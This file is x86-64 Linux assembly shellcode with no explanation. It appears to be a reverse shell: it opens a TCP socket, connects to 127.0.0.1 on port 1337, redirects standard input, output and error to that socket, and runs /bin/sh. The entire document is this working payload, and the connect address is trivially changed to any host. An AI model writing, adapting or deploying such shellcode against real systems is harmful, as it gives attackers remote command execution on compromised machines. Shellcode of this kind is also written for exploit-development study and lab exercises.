BITS 64
global _start

section .text
_start: 
xor rax,rax
xor rdi,rdi
xor rsi,rsi
xor rdx,rdx
xor rdx,rdx
mov sil,0x01
mov dil,0x02
mov al,0x29
syscall
mov dil,al
xor r11,r11
push 0x0100007f
push word 0x3905
push word 0x2
mov rsi,rsp
mov dl,0x10
mov al,0x2a
syscall
xor r11,r11
mov dil,0x03
mov rsi,r11
mov al,0x21;
syscall
xor r11,r11
mov dil,0x03
mov sil,0x01
mov al,0x21
syscall;
xor r11,r11
mov dil,0x03
mov sil,0x02
mov al,0x21
syscall;
xor rax,rax
xor rdi,rdi
xor rsi,rsi
xor r13,r13
mov al,59
mov rdi,"/bin/sh"
push r13
push rdi
mov rdi,rsp
push r13
push rdi
mov rsi,rsp
xor rdx,rdx
syscall
